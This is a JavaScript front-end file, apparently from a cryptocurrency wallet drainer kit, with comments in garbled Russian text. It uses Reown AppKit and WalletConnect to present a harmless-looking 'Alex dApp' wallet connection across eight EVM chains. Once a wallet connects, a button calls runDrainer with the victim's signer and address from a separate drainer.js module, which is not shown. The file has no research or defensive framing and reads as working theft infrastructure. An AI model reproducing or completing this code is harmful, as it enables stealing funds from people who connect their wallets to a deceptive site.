import { createAppKit } from '@reown/appkit'
import {
  mainnet,
  polygon,
  bsc,
  avalanche,
  arbitrum,
  optimism,
  linea,
  base
} from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer.js'

const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'

// –í—Å–µ —Å–µ—Ç–∏, –∫–æ—Ç–æ—Ä—ã–µ —Ç—ã —Ö–æ—á–µ—à—å –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞—Ç—å
const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]

// –ê–¥–∞–ø—Ç–µ—Ä –¥–ª—è Wagmi (WalletConnect –∏ –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–µ –∫–æ—à–µ–ª—å–∫–∏)
const wagmiAdapter = new WagmiAdapter({
  projectId,
  networks
})

// –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –¥–ª—è WalletConnect/Trust Wallet
const metadata = {
  name: 'Alex dApp',
  description: 'Connect your wallet',
  url: 'https://checkalex.xyz',
  icons: ['https://checkalex.xyz/icon.png']
}

// –°–æ–∑–¥–∞—ë–º AppKit –º–æ–¥–∞–ª–∫—É
const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata,
  projectId,
  features: {
    analytics: true
  }
})

// –°—Å—ã–ª–∫–∏ –Ω–∞ —ç–ª–µ–º–µ–Ω—Ç—ã
const connectBtn = document.getElementById('connect-btn')
const drainerBtn = document.getElementById('drainer-btn')
const status     = document.getElementById('status')

// –†–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –∫–Ω–æ–ø–∫—É drainer –Ω–∞ –≤—Å—è–∫–∏–π —Å–ª—É—á–∞–π
drainerBtn.disabled = false

let provider = null
let signer   = null
let address  = null

// –ö–Ω–æ–ø–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
connectBtn.addEventListener('click', () => {
  modal.open()
})

// –ü–æ—Å–ª–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞
modal.on('connect', async () => {
  try {
    provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
    signer   = provider.getSigner()
    address  = await signer.getAddress()

    status.textContent = `‚úÖ –ü–æ–¥–∫–ª—é—á–µ–Ω–æ: ${address}`
    drainerBtn.disabled = false
  } catch (err) {
    console.error('–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è:', err)
    status.textContent = `‚ùå –û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è`
  }
})

// –ó–∞–ø—É—Å–∫ drainer
drainerBtn.addEventListener('click', async () => {
  if (!signer || !address) {
    status.textContent = '‚ùó –°–Ω–∞—á–∞–ª–∞ –ø–æ–¥–∫–ª—é—á–∏—Ç–µ –∫–æ—à–µ–ª—ë–∫'
    return
  }

  drainerBtn.disabled = true
  status.textContent = 'üí• –ó–∞–ø—É—Å–∫ Drainer...'

  try {
    await runDrainer(provider, signer, address)
    status.textContent = '‚úÖ Drainer –∑–∞–≤–µ—Ä—à—ë–Ω'
  } catch (err) {
    console.error('–û—à–∏–±–∫–∞ –≤ Drainer:', err)
    status.textContent = `‚ùå –û—à–∏–±–∫–∞: ${err.message}`
  } finally {
    drainerBtn.disabled = false
  }
})
